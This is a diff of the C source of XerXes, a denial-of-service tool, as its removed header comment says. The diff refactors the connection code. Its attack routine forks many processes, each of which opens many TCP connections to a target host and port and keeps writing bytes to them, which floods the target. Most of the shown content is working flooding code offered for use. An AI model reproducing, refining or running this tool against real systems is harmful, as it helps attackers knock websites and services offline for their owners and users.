@@ -1,5 +1,3 @@
-/* XerXes - Most powerful dos tool - THN (http://www.thehackernews.com) */
-
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -12,34 +10,42 @@
 #include <netinet/in.h>
 #include <arpa/inet.h>
 
-int make_socket(char *host, char *port) {
-	struct addrinfo hints, *servinfo, *p;
-	int sock, r;
-//	fprintf(stderr, "[Connecting -> %s:%s\n", host, port);
+struct addrinfo *get_servinfo(char *host, char *port) {
+    int r;
+    struct addrinfo hints, *servinfo;
 	memset(&hints, 0, sizeof(hints));
 	hints.ai_family = AF_UNSPEC;
 	hints.ai_socktype = SOCK_STREAM;
-	if((r=getaddrinfo(host, port, &hints, &servinfo))!=0) {
+	if((r=getaddrinfo(host, port, &hints, &servinfo)) != 0) {
 		fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(r));
 		exit(0);
 	}
-	for(p = servinfo; p != NULL; p = p->ai_next) {
-		if((sock = socket(p->ai_family, p->ai_socktype, p->ai_protocol)) == -1) {
+	return servinfo;
+}
+
+int make_socket(char *host, char *port) {
+	struct addrinfo *servinfo, *p;
+	int sock;
+
+    servinfo = get_servinfo(host, port);
+
+	for (p = servinfo; p != NULL; p = p->ai_next) {
+		if ((sock = socket(p->ai_family, p->ai_socktype, p->ai_protocol)) == -1) {
 			continue;
 		}
-		if(connect(sock, p->ai_addr, p->ai_addrlen)==-1) {
+		if (connect(sock, p->ai_addr, p->ai_addrlen) == -1) {
 			close(sock);
 			continue;
 		}
 		break;
 	}
-	if(p == NULL) {
-		if(servinfo)
+	if (p == NULL) {
+		if (servinfo)
 			freeaddrinfo(servinfo);
 		fprintf(stderr, "No connection could be made, we will try next time\n");
-		return 0;
+		exit(0);
 	}
-	if(servinfo)
+	if (servinfo)
 		freeaddrinfo(servinfo);
 	fprintf(stderr, "[Connected -> %s:%s]\n", host, port);
 	return sock;
@@ -62,9 +68,6 @@ void attack(char *host, char *port, int id) {
 		for(x=0; x != CONNECTIONS; x++) {
 			if(sockets[x] == 0) {
 				sockets[x] = make_socket(host, port);
-				if(sockets[x] == 0) {
-					continue;
-				}
 			}
 			r=write(sockets[x], "\0", 1);
 			if(r == -1) {
@@ -91,12 +94,15 @@ void cycle_identity() {
 }
 
 int main(int argc, char **argv) {
+    char *host = argv[1];
+    char *port = argv[2];
+    get_servinfo(host, port);
 	int x;
-	if(argc !=3)
+	if(argc != 3)
 		cycle_identity();
-	for(x=0; x != THREADS; x++) {
+	for(x = 0; x != THREADS; x++) {
 		if(fork())
-			attack(argv[1], argv[2], x);
+			attack(host, port, x);
 		usleep(200000);
 	}
 	getc(stdin);
